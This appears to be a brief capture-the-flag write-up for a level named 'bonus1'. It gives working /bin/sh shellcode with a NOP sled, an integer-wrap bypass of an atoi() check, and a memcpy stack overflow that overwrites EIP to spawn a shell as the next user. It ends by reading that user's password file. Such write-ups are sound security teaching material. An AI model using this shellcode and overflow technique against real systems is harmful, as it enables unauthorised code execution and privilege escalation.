Like the previous exercise, we implement an environment variable `EXPLOIT` :
```bash
export EXPLOIT=$(python -c "print '\x90' * 300 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'")
```

We found an `atoi` using our `argv[1]` and a condition which using `memcpy` only if `atoi` return is under 10.
We just need to underflow `argv[1]` to bypass the condition, after we insert into `argv[2]` a padding of 56 bytes and our `EXPLOIT` address in `EIP` register :
```bash
./bonus1 -2147483628 $(python -c "print 'A' * 56 + '\x04\xf8\xff\xbf'")
$ whoami
bonus2
$ cd .. && cat bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
